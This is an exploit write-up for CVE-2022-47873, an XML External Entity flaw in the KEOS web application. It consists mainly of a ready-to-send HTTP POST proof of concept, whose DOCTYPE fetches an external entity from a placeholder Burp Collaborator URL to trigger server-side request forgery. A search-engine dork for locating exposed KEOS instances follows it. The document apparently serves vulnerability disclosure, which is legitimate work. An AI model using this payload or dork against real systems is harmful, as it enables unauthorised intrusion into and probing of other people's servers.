# Exploit Title: CVE-2022-47873 KEOS Software XXE 

# Exploit Author: Ömer Akincir

# Team: Ömer Yılmaz

# CVE-ID: CVE-2022-47873

# Version: 1.0 >=

# Vuln Details: XXE  

# Description: 

  KEOS application running on the web is vulnerable to XML External Entity (XXE) attack.
    
# Impact: 
  
  An attacker can trigger SSRF over XXE using Proof Of Concept.
  
# PoC:  
```  
POST /KEOS/ HTTP/1.1
Host:
Content-Type: application/xml
Soapaction: ""
Content-Length: 160
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36

<?xml version="1.0" encoding="utf-8"?>

  <!DOCTYPE roottag PUBLIC "-//A//B//EN" "http://BURP-COLLOBRATOR-URL">

  <roottag>test</roottag>

```

# Dorks:
  
  inurl:keos
